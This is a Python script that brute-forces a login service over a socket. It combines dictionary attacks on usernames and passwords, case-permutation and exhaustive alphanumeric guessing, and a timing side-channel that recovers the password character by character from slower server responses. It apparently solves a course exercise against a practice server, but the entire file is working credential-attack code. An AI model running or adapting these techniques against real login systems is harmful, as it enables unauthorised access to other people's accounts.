"""
password hacker for a website that uses commonly used user logins or passwords
brute forces the combinations and sends/receives data with socket and json
"""

import sys
import socket
import itertools
import string
import json
from datetime import datetime

class Hack:

    def __init__(self, sys_args):
        self.host = sys_args[1]
        self.port = int(sys_args[2])
        self.client_socket = None

        self.pw_list = self.parse_file_dict("passwords.txt")
        self.login_list = self.parse_file_dict("logins.txt")

    def main(self):
        
        with socket.socket() as self.client_socket:
            self.connect(self.host, self.port)
            self.pass_brute_login(self.login_list)

    def connect(self, host, port):
        """
        takes host and port, and connects to address
        :param host:
        :param port:
        :return:
        """
        address = (host, int(port))  # in case port not converted
        self.client_socket.connect(address)

    def send(self, data):
        """
        encodes data to bytes type and sends through socket
        :param data:
        :return:
        """
        data = data.encode()
        self.client_socket.send(data)

    def receive(self):
        """
        receives data from server socket and returns it
        :return:
        """
        response = self.client_socket.recv(1024)  # assume buffer size
        response = response.decode()
        return response

    def pass_brute_force(self, length):
        """
        generates all combos of lowercase alphanumeric passwords up to length
        tests the pw on the site provided
        :return:
        """
        # generate the full list of lowercase chars
        alpha_list = list(string.ascii_lowercase)
        num_list = list(map(str, list(range(10))))  # generate nums in range, convert to string
        combined_list = alpha_list + num_list

        # Cartesian product of input iterables.
        # To compute the product of an iterable with itself,
        # specify the number of repetitions with the optional repeat keyword argument
        # For example, product(A, repeat=4) means the same as product(A, A, A, A).
        for i in range(1, length):
            pw_iter = itertools.product(combined_list, repeat=i)
            for pw in pw_iter:
                pw = "".join(pw)
                self.send(pw)
                response = self.receive()  # for some reason calling self.receive in the below doesn't work

                if response == "Connection success!":
                    print(pw)
                    sys.exit()
                elif response == "Too many attempts":
                    print("Error: too many attempts")
                    sys.exit()

    def pass_brute_dict(self, pw_list):
        """
        takes a list of pw strings, gets all upper/lowercase permutations, tests against site
        :return:
        """
        for pw in pw_list:
            pw_permutations = self.cap_permutations(pw)
            for pw_perm in pw_permutations:
                self.send(pw_perm)
                response = self.receive()

                if response == "Connection success!":
                    print(pw_perm)
                    sys.exit()
                elif response == "Too many attempts":
                    print("Error: too many attempts")
                    sys.exit()

    def cap_permutations(self, string):
        """
        takes a string of alphanumeric chars and returns list of all permutations of upper/lowercase
        https://stackoverflow.com/a/11165671/13944490
        :param string:
        :return list:
        """
        # this creates a generator with same number of tuples as the string
        # upper doesn't throw errors with nums so ok to use
        # e.g. ('f', 'F')('o', 'O')('x', 'X') from fox has 3 tuples
        lower_upper_seq = ((c.lower(), c.upper()) for c in string)
        # we unpack the tuples so we can take cartesian product on all combos
        # will have 2 ^ len(string) combos
        # e.g. ('f', 'o', 'x'), ('f', 'o', 'X'), ('f', 'O', 'x')
        # ('f', 'O', 'X'), ('F', 'o', 'x'), ('F', 'o', 'X')
        # ('F', 'O', 'x'), ('F', 'O', 'X')
        # and then we join it and return as list to use later
        perm_list = ["".join(x) for x in itertools.product(*lower_upper_seq)]

        return perm_list

    def parse_file_dict(self, file_name):
        """
        takes a file_name to use as pw dict, splits it on newlines, returns list of pw
        alternatively takes a admin(user) as admin dict and does the same
        :param file_name:
        :return list of pw:
        """
        with open(file_name, "r", encoding="utf-8") as f:
            text_list = f.read().split("\n")
        return text_list

    def pass_brute_login(self, login_list):
        """
        takes a list of admin logins, finds the one that works
        then tests increasing lengths of pw until find the one that takes longer time
        :param login_list:
        :return:
        """
        login_pw_dict = dict.fromkeys(("login", "password"))

        for login in login_list:
            login_pw_dict["login"] = login
            login_pw_dict["password"] = " "  # using an empty pw per instructions
            resp_dict, diff = self.send_rec_json(login_pw_dict)

            # In case of the wrong login, the response you receive looks like this:
            if resp_dict["result"] == "Wrong login!":
                continue
            # If you got the login right but failed to find the password, you get this:
            elif resp_dict["result"] == "Wrong password!":
                break
            else:
                print("Error in login step")
                sys.exit()

        combined_list = list(string.ascii_letters + string.digits)  # all upper/lowercase and digits

        # have to reset to empty string to work well with .product()
        login_pw_dict["password"] = ""

        while True:
            # have to put the password in a list, if not it gets iterated as a string
            pw_iter = itertools.product([login_pw_dict["password"]], combined_list)
            for pw in pw_iter:
                login_pw_dict["password"] = "".join(pw)

                resp_dict, diff = self.send_rec_json(login_pw_dict)

                # if resp_dict["result"] == "Exception happened during login":
                #     break
                # the vulnerability is that if the time difference takes a while, that's the right pw
                # assumes the admin caught the original exception above, which takes some time to do
                if resp_dict["result"] == "Wrong password!" and diff >= 10000:
                    break
                elif resp_dict["result"] == "Wrong password!":
                    continue
                elif resp_dict["result"] == "Connection success!":
                    print(json.dumps(login_pw_dict))
                    sys.exit()
                # else:
                #     print("Error in pw step")
                #     sys.exit()

    def send_rec_json(self, dictionary):
        """
        converts a dict to json, sends to server, receives data in json and converts back
        :param dictionary:
        :return the dictionary and the time difference in microsecs:
        """
        json_str = json.dumps(dictionary)
        self.send(json_str)
        start = datetime.now()
        response = self.receive()
        end = datetime.now()
        diff = (end - start).microseconds
        resp_dict = json.loads(response)

        return resp_dict, diff

    def close(self):
        self.client_socket.close()

if __name__ == "__main__":
    Hack(sys.argv).main()
